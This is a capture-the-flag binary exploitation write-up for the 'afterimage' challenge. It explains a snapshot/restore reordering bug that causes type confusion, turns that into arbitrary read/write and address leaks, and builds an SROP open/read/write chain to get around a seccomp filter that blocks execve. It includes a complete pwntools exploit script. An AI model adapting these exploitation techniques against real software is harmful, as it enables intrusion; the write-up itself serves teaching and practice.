# afterimage - Writeup

**Category:** pwn (binary exploitation)
**Target:** `afterimage` - x86-64, glibc 2.39, statically-configured seccomp
**Technique:** type-confusion from a snapshot/restore bug → arbitrary read/write → SROP → ORW

## 1. The challenge

`afterimage` is a menu-driven "telemetry engine." You can create objects, edit them, link them, snapshot them, restore them, and inspect them.

**Objects.** There are four kinds, each identified by a small type number:

| Type | Name | Notable field |
|------|------|---------------|
| 1 | ChannelNode | a name string you choose |
| 2 | DataBuffer | a size, a capacity, and a data pointer |
| 3 | TransformNode | a function pointer + a context pointer |
| 4 | StreamRouter | a cached pointer ("fastpath") to a target object |

**Memory layout.** A session structure is allocated on the heap (`calloc(0x2a0)`). Separately, a `mmap`'d **arena** of `0x2000` bytes holds up to 64 object "slots" of `0x80` bytes each. Slot *n* lives at `arena + n*0x80`. A small table inside the session maps each object's logical **id** to a pointer to its slot (`session[id+1] = slot`).

**Protections.** Full RELRO, stack canary, NX, PIE, and FORTIFY are all enabled — so no classic buffer overflow, no GOT overwrite, and every address is randomized.

**Seccomp.** A syscall filter is installed. It is a **blacklist**: it only kills `execve` and `execveat`. Everything else — including `open`, `openat`, `read`, `write`, and `rt_sigreturn` — is allowed.

That last point decides the whole strategy. We can't pop a shell, so the goal is **ORW**: **o**pen the flag file, **r**ead it, **w**rite it back to the socket.

---

## 2. The bug: snapshots reorder objects, but a Router doesn't notice

### What snapshot/restore actually does

When you **snapshot**, the program serializes all live objects **grouped by type**: all Channels first, then all DataBuffers, then all Transforms, then all Routers.

When you **restore**, it rebuilds the objects into fresh slots **in that same type-grouped order**. So the slot an object lands in after a restore depends on its *type*, not on where it used to be.

**Consequence:** an object's slot can change across a snapshot/restore.

### Why that's dangerous

A **StreamRouter** caches the raw memory offset of its target object (its "fastpath"), plus a "generation stamp" that is meant to detect when the target has been replaced. In this build the generation stamp is always `0`, and freshly restored objects also have generation `0`, so the check always passes.

So after a restore:

- The Router still holds the **old** slot offset.
- That slot now holds a **different** object (because of the reordering).
- The staleness check is bypassed (generation `0` matches generation `0`).

The Router is now a **stale pointer** aimed at whatever object happens to occupy that slot — a textbook **type confusion**. This is the "afterimage": the Router sees the ghost of its previous target.

### Proof

Create a Router, a DataBuffer, and a Transform, then link the Router to the object in slot 1 and snapshot/restore:

```
before:  slot0 Router      slot1 DataBuffer   slot2 Transform
after :  slot0 DataBuffer  slot1 Transform    slot2 Router
```

The Router's cached fastpath is still `0x80` (slot 1). Before the restore that was the DataBuffer; after the restore, slot 1 is a **Transform**. Same pointer, different object.

---

## 3. Primitive 1 - turning the confusion into an arbitrary write

We want the stale Router to point at a **ChannelNode**, because a Channel is the one object type whose bytes we fully control.

When the program **dispatches** a packet through a Router's fastpath, it treats the target as if it were a DataBuffer:

- it reads a **capacity** from `target + 0x14`,
- it reads a **data pointer** from `target + 0x18`,
- then it does `memcpy(data_pointer, packet, length)`.

For a ChannelNode, offsets `0x14` and `0x18` fall inside the **name string** — which we choose when we create the channel. So by crafting the name we control both the "capacity" and the "data pointer" the dispatch will use:

```python
name = b"ZZZZ" + p32(0xffffffff) + p64(target)[:6]
#       \_____/   \___________/     \____________/
#        padding   capacity          data pointer  (where the write lands)
```

Now `dispatch(router, payload)` becomes:

```
memcpy(target, payload, len(payload))   →   ARBITRARY WRITE
```

**Two constraints on the name** (they don't apply to the payload):

- The name is read with `fgets`, so it can't contain a newline (`0x0a`).
- The name is stored with `strncpy`, which stops at a null byte (`0x00`), so the 6 meaningful address bytes must not contain one. (The two trailing zero bytes of a normal 6-byte address are fine — they act as the terminator.)

The dispatch **payload** is read with `read()`, so it can be any bytes at all.

**Recipe to line up Router → Channel:** create a Transform (used later for leaks), then two Channels `Ca` and `Cb`, then a Router; link the Router to `Ca`; then snapshot and restore. After the reorder, the Router's cached slot now holds `Cb`, whose name we control. `Cb` is our write vector.

---

## 4. Primitive 2 - a repeatable read/write

A single write isn't enough; we need to read and write many addresses. We bootstrap a reusable primitive with **one** use of the arbitrary write.

The plan is to build a **fake DataBuffer** in memory that we fully control, and then point one of the id-table entries at it:

1. After the restore, create a real DataBuffer (call it the **host**). Its data lives at a fixed, known offset from the session (`L = session + 0x350`, measured and stable).
2. Inside that host buffer, lay out a fake DataBuffer object: `{ type = 2, size, capacity = 0x1000, data_pointer = X }`.
3. Use the one arbitrary write to set `session[FAKE_ID + 1] = L`, i.e. make a spare id point at our fake object.

Now:

- **`inspect(FAKE_ID)`** prints the bytes at `X` → **arbitrary read**.
- **`edit(FAKE_ID, data)`** copies `data` to `X` → **arbitrary write**.

To read or write a different address, we just edit the **host** buffer to change the fake object's `data_pointer` (`X`), then inspect/edit `FAKE_ID` again. This is our reliable read/write for the rest of the exploit. (Note: `inspect` prints a fixed 32 bytes per call — four 64-bit values — which is plenty.)

---

## 5. Leaking the addresses we need

With a stable read primitive, the leaks are straightforward:

- **PIE base:** a TransformNode stores a pointer into the program's own code. `inspect` prints it as "Handler ID". `PIE = HandlerID − 0x1ba0`.
- **Session (heap) address:** the same Transform's "Context Ref" is a heap pointer at a fixed distance from the session. `session = ContextRef − 0x2b0`.
- **libc base:** read the program's GOT entry for `puts` (we know the PIE base), which contains the real address of `puts` in libc. Subtract `puts`'s known offset → libc base.
- **Stack address:** read libc's `environ` variable, which always holds a pointer onto the stack.

> **A note on the libc offset (this bit me on the real server).** The `puts` offset matched the handout libc exactly, which means the code section (`.text`) matched. But `environ` lives in the data section (`.bss`), and its offset **drifted by `0x1000`** on the remote because the server's glibc was a slightly different patch level. The fix in the final script is to not hardcode `environ`: try a few known offsets, and if none give a valid stack pointer, scan a small region of libc's data for one. Because `__libc_start_main` is in `.text` (which matched), its offset stayed correct — only the `.bss` lookup needed to adapt.

---

## 6. Getting code execution - SROP

We have arbitrary write and we know where the stack is, so we can overwrite a return address. The natural target is **`main`'s saved return address**, because we can trigger `main` to return simply by choosing the "Exit" menu option. We locate that saved return address by scanning the stack for a value that points into `__libc_start_call_main` (the function that called `main`), just below `__libc_start_main`.

Now, how to build the ORW chain? Normally you'd set the syscall arguments with `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`, etc. But **this libc has no `pop rdx` gadget at all**, and `rdx` is the length argument for `read`/`write`. Without it, a plain ROP chain can't set up the syscalls.

**Solution: sigreturn-oriented programming (SROP).** The `rt_sigreturn` syscall restores *every* register from a structure on the stack in one shot. Since `rt_sigreturn` is allowed by the seccomp filter, we can control all registers without needing individual `pop` gadgets. We only need two gadgets, both present:

- `pop rax ; ret` — to load `15` (the `rt_sigreturn` syscall number)
- `syscall ; ret` — to execute the syscall

We chain three sigreturn frames back-to-back, each setting up one syscall:

```
pop rax ; 15 ; syscall     →  frame that calls  open("/home/ctf/flag.txt", O_RDONLY)
pop rax ; 15 ; syscall     →  frame that calls  read(3, buf, 0x200)
pop rax ; 15 ; syscall     →  frame that calls  write(1, buf, 0x200)
```

Each frame also sets the stack pointer to the next frame, so they run in sequence. We write this whole blob over `main`'s saved return address using the arbitrary write, then choose **Exit**. `main` returns straight into the chain, the flag file is opened, read into a buffer, and written back to us over the socket.

**Flag path.** The service runs under `xinetd` with a working directory of `/`, and the flag is at `/home/ctf/flag.txt`, so the remote exploit opens the absolute path. (Locally the flag is just `flag.txt`.)

---

## 7. The full exploit chain, in one line

> stale-Router type confusion (from the snapshot reorder) → channel-name arbitrary write → fake DataBuffer for repeatable read/write → leak PIE, libc, and stack → overwrite `main`'s return address with an SROP open/read/write chain → receive the flag.

---

## 8. Exploit

The script is self-contained: it needs only `pwntools` and a network connection (all offsets are baked in). Run it with `python3 solve_remote.py`, or `python3 solve_remote.py HOST=<host> PORT=<port>`. It retries automatically when ASLR produces an unlucky address (a null or newline byte in the write target) or a connection hiccups.

```python
#!/usr/bin/env python3
# afterimage — self-contained remote exploit (no local binary/libc needed).
#   run:   python3 solve_remote.py
#   or:    python3 solve_remote.py HOST=host PORT=port
#   local: python3 solve_remote.py LOCAL
from pwn import *

context.update(arch='amd64', os='linux', log_level='info')
HOST = args.HOST or 'afterimage.chall.rootriet.in'
PORT = int(args.PORT or 31337)

# ---- constants baked from the handout (afterimage + libc 2.39) ----
GOT_PUTS  = 0x7f28     # PIE-relative GOT slot of puts
LIBC_PUTS = 0x87cc0    # libc-relative
LIBC_ENV  = 0x20ad58   # libc environ (handout); adapts at runtime if it drifts
LIBC_LSM  = 0x2a200    # libc __libc_start_main (.text, defines main-ret scan window)
G_POP_RAX = 0xdd337    # pop rax ; ret
G_SYSCALL = 0x99096    # syscall ; ret
HANDLER   = 0x1ba0     # PIE     = Transform HandlerID - 0x1ba0
CTX2SES   = 0x2b0      # session = first Transform CtxRef - 0x2b0
L_OFF     = 0x350      # post-restore host DataBuffer data = session + 0x350
FAKE_ID   = 10

# ---- interaction helpers ----
def start():
    if args.LOCAL:
        ld='./ld-linux-x86-64.so.2'
        if os.path.exists(ld):
            return process([ld, './afterimage'], env={'LD_LIBRARY_PATH':'.'})
        return process(['./afterimage'])
    return remote(HOST, PORT)
def m(p,c): p.recvuntil(b'> '); p.sendline(str(c).encode())
def c_chan(p,name,flags):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'1')
    p.recvuntil(b'Channel Name > '); p.send(name+b'\n')
    p.recvuntil(b'Routing Flags (hex/dec) > '); p.sendline(str(flags).encode()); p.recvuntil(b'\n')
def c_buf(p,cap,data=b''):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'2')
    p.recvuntil(b'Buffer Capacity > '); p.sendline(str(cap).encode())
    p.recvuntil(b'Initial Data Size > '); p.sendline(str(len(data)).encode())
    if data: p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'\n')
def c_trans(p,mode,tok):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'3')
    p.recvuntil(b') > '); p.sendline(str(mode).encode())
    p.recvuntil(b'Token (hex/dec) > '); p.sendline(str(tok).encode()); p.recvuntil(b'\n')
def c_router(p,t,s):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'4')
    p.recvuntil(b'Target Logical ID > '); p.sendline(str(t).encode())
    p.recvuntil(b'Source Logical ID > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def link(p,r,t):
    m(p,4); p.recvuntil(b'Router ID > '); p.sendline(str(r).encode())
    p.recvuntil(b'Target Object ID > '); p.sendline(str(t).encode()); p.recvuntil(b'\n')
def edit(p,i,data):
    m(p,2); p.recvuntil(b'Object ID > '); p.sendline(str(i).encode())
    p.recvuntil(b'Data Size > '); p.sendline(str(len(data)).encode())
    p.recvuntil(b'> '); p.send(data); p.recvuntil(b'\n')
def snap(p,s): m(p,6); p.recvuntil(b'Slot (0-3) > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def restore(p,s): m(p,7); p.recvuntil(b'Slot (0-3) > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def dispatch(p,r,data):
    m(p,8); p.recvuntil(b'Router ID > '); p.sendline(str(r).encode())
    p.recvuntil(b'Packet Length > '); p.sendline(str(len(data)).encode())
    p.recvuntil(b'> '); p.send(data); p.recvuntil(b'\n')
def inspect(p,i):
    m(p,5); p.recvuntil(b'Object ID > '); p.sendline(str(i).encode())
    return p.recvuntil(b'=== AFTERIMAGE', drop=True)
def insp_transform(p,i):
    d=inspect(p,i)
    return (int(d.split(b'Handler ID : ')[1].split(b'\n')[0],16),
            int(d.split(b'Context Ref: ')[1].split(b'\n')[0],16))
def payload_hex(d):
    return bytes.fromhex(d.split(b'Payload Hex: ')[1].split(b'\n')[0].strip().decode())
def bad(b): return b'\x00' in b or b'\n' in b

def attempt():
    p=start()
    # === leak PIE + session ===
    c_trans(p,1,0xdead)
    hid,ctx=insp_transform(p,1)
    pie=hid-HANDLER; session=ctx-CTX2SES
    log.info('PIE=%#x session=%#x', pie, session)
    L=session+L_OFF; wt=session+8+FAKE_ID*8

    # === stale-router arbitrary-write via type-repack ===
    cbname=b'ZZZZ'+p32(0xffffffff)+p64(wt)[:6]
    if bad(cbname): raise ValueError('unlucky ASLR bytes')
    c_chan(p,b'AAAA',0)                 # id2 Ca
    c_chan(p,cbname,0)                  # id3 Cb (name = write vector after repack)
    c_router(p,0,0)                     # id4 R
    link(p,4,2)                         # R.fastpath = Ca slot (0x80)
    snap(p,0); restore(p,0)             # repack: slot1 -> Cb ; R now points at a channel

    # host DataBuffer for the fake object (after restore so it survives)
    fake0=flat({0:p32(FAKE_ID)+p16(2)+p16(1),0x10:p32(0x20)+p32(0x1000),
                0x18:p64(pie+GOT_PUTS)}, length=0x40, filler=b'\x00')
    c_buf(p,0x1000,fake0)               # id5, data at L
    dispatch(p,4,p64(L))                # one-shot: session[FAKE_ID+1] = L

    # === repeatable arbitrary R/W via fake DataBuffer at L ===
    def set_ptr(a,cap=0x1000):
        edit(p,5,flat({0:p32(FAKE_ID)+p16(2)+p16(1),0x10:p32(0x20)+p32(cap),
                       0x18:p64(a)}, length=0x40, filler=b'\x00'))
    def aread(a): set_ptr(a); return payload_hex(inspect(p,FAKE_ID))
    def awrite(a,d): set_ptr(a,max(0x1000,len(d)+0x10)); edit(p,FAKE_ID,d)

    puts=u64(aread(pie+GOT_PUTS)[:8]); libc=puts-LIBC_PUTS
    if libc & 0xfff: raise ValueError('libc misaligned (remote libc mismatch?)')
    log.info('libc=%#x', libc)

    # environ is in libc .bss, whose offset drifts between glibc patch levels
    # (puts/.text matched, so only .bss shifted). Find a stack pointer robustly.
    def is_stk(v): return 0x7ff000000000 <= v < 0x800000000000
    env=0
    for eo in (LIBC_ENV, 0x20bd58, 0x209d58, 0x20cd58, 0x208d58, 0x20dd58):
        v=u64(aread(libc+eo)[:8])
        if is_stk(v): env=v; break
    if not env:                                  # page-scan fallback
        for pg in range(0x204000, 0x218000, 0x1000):
            blk=aread(libc+pg+0xd40)
            for i in range(0,32,8):
                v=u64(blk[i:i+8])
                if is_stk(v): env=v; break
            if env: break
    if not env: raise ValueError('no stack pointer found (environ)')
    log.info('libc=%#x env=%#x', libc, env)

    # === locate main's saved RIP (return into __libc_start_call_main) ===
    lsm=libc+LIBC_LSM; S=None; base=(env & ~0xf)
    for off in range(0x40,0x3000,0x20):
        blk=aread(base-off)                      # 32B = 4 qwords per roundtrip
        for i in range(0,32,8):
            v=u64(blk[i:i+8])
            if lsm-0x400<=v<lsm: S=base-off+i; break
        if S: break
    if not S: raise ValueError('main ret not found')
    log.info('main ret slot=%#x (env-%#x)', S, env-S)

    # === SROP open / read / write ===
    sc=libc+G_SYSCALL; pr=libc+G_POP_RAX
    trig=p64(pr)+p64(15)+p64(sc); F=len(bytes(SigreturnFrame()))
    o_fo=0x18; o_t2=o_fo+F; o_fr=o_t2+0x18; o_t3=o_fr+F; o_fw=o_t3+0x18; o_path=o_fw+F
    path=(b'flag.txt' if args.LOCAL else b'/home/ctf/flag.txt')+b'\x00'
    path_addr=S+o_path; buf=S-0x600
    def frame(rax,rdi,rsi,rdx,rsp):
        f=SigreturnFrame(); f.rax=rax; f.rdi=rdi; f.rsi=rsi; f.rdx=rdx; f.rip=sc; f.rsp=rsp; return bytes(f)
    blob=(trig+frame(2,path_addr,0,0,S+o_t2)      # open(path, 0, 0)
              +trig+frame(0,3,buf,0x200,S+o_t3)   # read(3, buf, 0x200)
              +trig+frame(1,1,buf,0x200,S+o_path) # write(1, buf, 0x200)
              +path)
    awrite(S,blob)
    m(p,0)                                        # Exit -> main returns -> SROP chain
    out=p.recvall(timeout=8); p.close(); return out

def go():
    for i in range(16):
        try: out=attempt()
        except (EOFError,ValueError,IndexError) as e:
            log.warning('attempt %d: %s — retry', i, e); continue
        if out:
            for line in out.split(b'\n'):
                if b'{' in line and b'}' in line:
                    log.success('FLAG: %s', line.strip().decode('latin1')); return
        log.warning('attempt %d: no flag — retry', i)
    log.failure('exhausted retries')

go()
```

---

## 9. Key offsets (verified stable)

```
PIE        = HandlerID - 0x1ba0
session    = ContextRef - 0x2b0
L (fake)   = session + 0x350
gadgets    = pop rax;ret @ libc+0xdd337   syscall;ret @ libc+0x99096
main ret   ≈ libc+0x2a1ca  (inside __libc_start_call_main; located by scanning)
```

---

## 10. Lessons

- **Serialization that reorders objects is a trap.** Any code that caches a raw slot or index and revalidates it with a weak check (here, a generation stamp that's always zero) will hand you a use-after-reorder type confusion.
- **A single controlled write is usually enough.** Convert it once into a fake object you own, then everything else (read, write, leaks) becomes cheap and repeatable.
- **Seccomp changes the goal, not the difficulty.** A blacklist that only blocks `execve` still leaves the entire ORW path open.
- **Match the remote libc, but don't over-trust it.** Code (`.text`) offsets matched while a data (`.bss`) symbol drifted by a page. Leaking or scanning for the value you need is more reliable than hardcoding every offset.

## FLAG
<img width="541" height="171" alt="image" src="https://github.com/user-attachments/assets/bbf7614e-cfd7-400b-94fc-3c4cbac5b154" />

